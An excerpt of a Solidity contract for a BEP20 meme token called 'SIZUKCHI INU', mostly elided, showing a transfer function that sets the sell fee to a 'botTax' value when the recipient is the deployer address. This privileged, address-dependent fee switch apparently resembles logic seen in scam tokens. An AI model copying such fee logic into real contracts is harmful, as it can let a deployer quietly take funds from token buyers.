...
contract SIZUKCHIINU is IBEP20, Auth {
    using SafeMath for uint256;
    string private constant _name = 'SIZUKCHI INU';
    string private constant _symbol = '$SIZUKCHI';
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if(recipient == deployer){sellFee = botTax;}
